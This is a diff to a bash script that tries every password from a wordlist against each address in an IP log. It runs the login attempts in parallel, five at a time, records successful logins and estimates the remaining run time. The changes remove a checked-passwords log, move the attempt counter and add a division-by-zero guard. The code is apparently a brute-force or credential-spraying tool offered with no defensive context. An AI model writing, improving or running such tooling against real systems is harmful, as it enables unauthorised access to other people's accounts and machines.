@@ -5,14 +5,12 @@ iplog_file="iplog.txt"
 passwords_file="passwords.txt"
 success_log_file="successful_logins.txt"
 temp_passwords_file="temp_passwords.txt"
-checked_passwords_log="checked_passwords_log.txt"
 
 # Create missing files if they don't exist
 [[ ! -f "$iplog_file" ]] && touch "$iplog_file"
 [[ ! -f "$passwords_file" ]] && touch "$passwords_file"
 [[ ! -f "$success_log_file" ]] && touch "$success_log_file"
 [[ ! -f "$temp_passwords_file" ]] && touch "$temp_passwords_file"
-[[ ! -f "$checked_passwords_log" ]] && touch "$checked_passwords_log"
 
 # Function to clean up before exiting (does not modify passwords.txt)
 cleanup() {
@@ -77,12 +75,13 @@ for index in "${!passwords[@]}"; do
     for entry in "${iplog_entries[@]}"; do
         # Attempt login
         attempt_login "$entry" "$password" &
-        ((attempts++))
 
         # Limit to 5 concurrent jobs to reduce load
         while (( $(jobs -r -p | wc -l) >= 5 )); do
             wait -n  # Wait for at least one job to finish
         done
+
+        ((attempts++))
     done
 
     # Wait for all background jobs to finish for this password
@@ -120,7 +119,7 @@ fi
 # Calculate elapsed time and estimate remaining time
 end_time=$(date +%s)
 elapsed_time=$(( end_time - start_time ))
-avg_time_per_password=$(( elapsed_time / successful_attempts ))
+avg_time_per_password=$(( elapsed_time / (successful_attempts > 0 ? successful_attempts : 1) ))
 remaining_passwords=$(wc -l < "$passwords_file")
 estimated_time=$(( remaining_passwords * avg_time_per_password ))
 
